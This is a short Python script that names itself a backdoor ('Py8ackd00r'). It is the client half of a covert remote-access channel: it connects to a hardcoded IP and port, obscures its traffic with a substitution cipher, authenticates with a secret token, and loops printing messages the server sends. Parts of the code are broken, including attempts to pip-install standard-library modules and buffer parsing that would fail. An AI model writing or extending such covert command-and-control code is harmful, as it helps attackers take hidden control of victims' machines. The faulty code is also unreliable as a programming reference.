try:
    import os
    import socket
    import time
except:
    os.system("pip install socket")
    os.system("pip3 install socket")
    os.system("pip install time")
    os.system("pip3 install time")

encrypted = list("b^$3k/I7h=gMnCe?«*HX#PqyuJRlDUSV_w6o>YmTK2'-|aL+9zrG<5s1\%OE48icQvdxp!AtNZB W»~jf&0F")
decrypted = list("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890!#$%&/=?*+~^-_«»'<>\| ")

server = "192.168.1.103" ##### Var
port = 23125 #### Var

def encrypt(string):
    final = ""
    for i in list(string):
        n = decrypted.index(i)
        final += encrypted[n]
    return final

def decrypt(string):
    final = ""
    for i in list(string):
        n = encrypted.index(i)
        final += decrypted[n]
    return final

try:
    server_connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_connection.connect((server, port))

    def recive(buffer):
        return decrypt(server_connection.recv(buffer).decode("utf-8"))

    def send(str):
        server_connection.send(encrypt(str).encode("utf-8"))

    send("231Py8ackd00r231")
    condition = True
    while condition:
        status = recive(1024)
        condition = False

    if status == "200":
        send("#1024")
        send("ola")
        condition = True
        while condition:
            bff = recive(1024)
            if bff.startswith("#"):
                buffer = int(bff.split("#")[0])
                print(buffer)
                condition_msg = True
                while condition_msg:
                    msg = recive(buffer)
                    condition_msg = False
            print(msg)

except Exception as e:
    print(e)
    pass




try:
    server_connection.close()
except:
    pass